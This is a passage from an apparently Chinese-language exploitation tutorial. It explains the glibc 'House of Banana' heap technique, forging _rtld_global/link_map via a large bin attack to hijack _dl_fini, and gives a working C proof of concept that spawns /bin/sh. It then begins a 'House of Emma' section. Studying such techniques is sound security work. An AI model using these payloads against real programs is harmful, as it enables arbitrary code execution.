class="line"></span><br><span class="line">		  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  <span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">DL_CALL_DT_FINI</span></span><br><span class="line">			  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">		  <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">		  <span class="keyword">if</span> (!do_audit &amp;&amp; __builtin_expect (<span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">struct</span> <span class="title class_">audit_ifaces</span> *afct = <span class="built_in">GLRO</span>(dl_audit);</span><br><span class="line">		      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> cnt = <span class="number">0</span>; cnt &lt; <span class="built_in">GLRO</span>(dl_naudit); ++cnt)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="keyword">if</span> (afct-&gt;objclose != <span class="literal">NULL</span>)</span><br><span class="line">			    <span class="comment">/* Return value is ignored.  */</span></span><br><span class="line">			    (<span class="type">void</span>) afct-&gt;<span class="built_in">objclose</span> (&amp;l-&gt;l_audit[cnt].cookie);</span><br><span class="line"></span><br><span class="line">			  afct = afct-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">		    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">	      --l-&gt;l_direct_opencount;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (! do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      do_audit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> again;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">		      <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">		      <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">		      <span class="built_in">GL</span>(dl_num_relocations),</span><br><span class="line">		      <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>只要伪造 <code>rtld_global</code> 结构体就可以使得 <code>array</code> 指向我们可控的数据区，从而伪造好一系列函数，进而劫持程序的流。可以触发 <code>call</code> 的有两个点，第一个点可以 <code>call</code> 到很多指针，是一个数组；另一个点就只有一个函数。剩下的工作就是根据代码绕过检测，调用到调用点，需要注意的是，有时候远程的 <code>rtld_global</code> 的偏移与本地不一样，需要爆破。<code>house of  banana</code>便是利用<code>large bin attack</code>往 <code>rtld_global</code> 写入堆的地址，并事先在堆里伪造好<code>rtld_global</code>结构体，这样程序<code>exit</code>或者正常退出 <code>main</code> 函数时，便会执行到伪造的函数，此时若我们将函数伪造成<code>one_gadget</code>或者<code>system</code> 则可以 <code>get shell</code>。</p>
<p><strong>利用思路：</strong></p>
<ul>
<li>直接伪造<code>_rtld_global</code>的<code>_ns_loaded</code>，布局好其他内容，使其调用到<code>fini_array</code></li>
<li>伪造<code>link_map</code>的<code>next</code>指针，布局好其他内容，使其调用到<code>fini_array</code></li>
<li>修改<code>link_map-&gt;l_addr</code>，根据偏移使其调用到指定区域的函数</li>
</ul>
<p><strong>试用场景：</strong></p>
<ul>
<li>程序能够显式的执行 <code>exit</code> 函数</li>
<li>程序通过 <code>libc_start_main</code> 启动的主函数，且主函数能够结束</li>
</ul>
<p><strong>需绕过的点：</strong></p>
<p>劫持<code>&amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake</code>。</p>
<ul>
<li><code>check0</code>：<code>fake+0x28 = fake</code></li>
</ul>
<p><code>maps</code> 必须要有四个元素，所以我劫持的是第三个节点的 <code>next</code> 指针这样不会破环长度从而绕过下面的两个断言。劫持时只需在<code>_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next</code>处写入 <code>fake</code> 就行，这时可以使用 <code>large bin attack</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">assert</span> (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line"><span class="built_in">assert</span> (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

<p>为了能写入 <code>maps[i] = l;</code>，需要绕过 <code>if (l == l-&gt;l_real)</code>，所以<code>fake+0x28 (offset is 0x28)</code>处要写入 <code>fake</code> 自己的地址。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l_next, *l_prev; <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l_real;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">assert</span> (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">        maps[i] = l;</span><br><span class="line">        l-&gt;l_idx = i;</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">            are not dlclose()ed from underneath us.  */</span></span><br><span class="line">        ++l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>check1</code>：<code>glibc_2.23==&gt;fake+0x314 = 0x1c || glibc_2.31==&gt;fake+0x31c = 0x1c</code></li>
</ul>
<p>是个枚举体中成员 <code>l_init_called</code>，由于各版本有所差异，所以还是现查现用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_global:<span class="number">1</span>;	<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_reserved:<span class="number">2</span>;	<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	  &#123;</span><br><span class="line">	      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		  &#123;</span><br><span class="line">		  	   <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		 	   l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>check2&amp;check3</code>：<code>l-&gt;l_info[DT_FINI_ARRAY] != NULL</code></li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">		       <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		       <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      		|| l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">		       &#123;</span><br><span class="line">		            <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		            <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">				    	    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">						_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),ns);</span><br><span class="line"></span><br><span class="line">		      		<span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      		<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">					&#123;</span><br><span class="line">			  			<span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    			(<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    		+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  				<span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    	/ <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  			<span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">				    		((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">					&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>控制 <code>array</code> 和 <code>i</code></li>
</ul>
<p>在 <code>fake+0x110</code> 写入的内容会直接控制 <code>array</code>，在 <code>fake+0x120</code> 写入的内容会控制<code>i</code>，只要把<code>fake+0x120，fake+0x110</code> 控制好就可以控制最后的<code>((fini_t) array[i]) ();</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line"> [...]</span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ElfW</span>(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"> [...]   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">			<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">				<span class="built_in">DL_CALL_DT_FINI</span>(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		    &#125;</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要在<code>fake+0x110</code>写入一个 <code>ptr</code>，且 <code>ptr+0x8</code> 处有 <code>ptr2</code>，<code>ptr2</code> 处写入的是最后要执行的函数地址，需要在<code>fake+0x120</code>写入一个<code>ptr</code>，且 <code>ptr+0x8</code> 处是<code>i*8</code>。例如<code>fake+0x110</code>写入<code>fake+0x40</code>，在<code>fake+0x48</code>写入<code>fake+0x58</code>，在<code>fake+0x58</code>写入 <code>shell</code>，在<code>fake+0x120</code>写入<code>fake+0x48</code>，在<code>fake+0x50</code>处写入 <code>8</code>。</p>
<h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a><a class="link"   href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">getLibcBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> to;</span><br><span class="line">    <span class="type">uint64_t</span> from;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="type">int</span>)<span class="built_in">getpid</span>());</span><br><span class="line">    file = <span class="built_in">fopen</span>(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">            <span class="built_in">fclose</span>(file);</span><br><span class="line">            <span class="keyword">return</span> from;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libcBase    = <span class="built_in">getLibcBase</span>();</span><br><span class="line">    <span class="comment">// ldBase + 0x2e060</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *	rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得		*	到远程环境的精确偏移</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">uint64_t</span> rtld_global = libcBase + <span class="number">0x23b060</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">    <span class="type">uint64_t</span>* next_node = (<span class="type">uint64_t</span>*)(rtld_global<span class="number">-0x49048</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);           <span class="comment">//force p1 insert in to the largebin</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node <span class="number">-0x20</span>);    <span class="comment">//push p2 into unsoteded bin</span></span><br><span class="line">    <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);           <span class="comment">//force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">    p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">3</span>] = fake;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-Emma"><a href="#House-of-Emma" class="headerlink" title="House of Emma"></a>House of Emma</h1><p><code>glibc &gt; 2.23</code>。</p>
<h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>在 <code>vtable</code> 段中存在一个<code> _IO_cookie_jumps</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line">	JUMP_INIT_DUMMY,</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(finish, _IO_file_finish),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(overflow, _IO_file_overflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(underflow, _IO_file_underflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_default_pbackfail),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(xsputn, _IO_file_xsputn),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seekoff, _IO_cookie_seekoff),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(setbuf, _IO_file_setbuf),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(sync, _IO_file_sync),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(doallocate, _IO_file_doallocate),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(read, _IO_cookie_read),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(write, _IO_cookie_write),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seek, _IO_cookie_seek),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(close, _IO_cookie_close),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_cookie_file</code> 有如下定义：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> __fp;</span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_io_functions_t</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中的函数定义如下：</p>
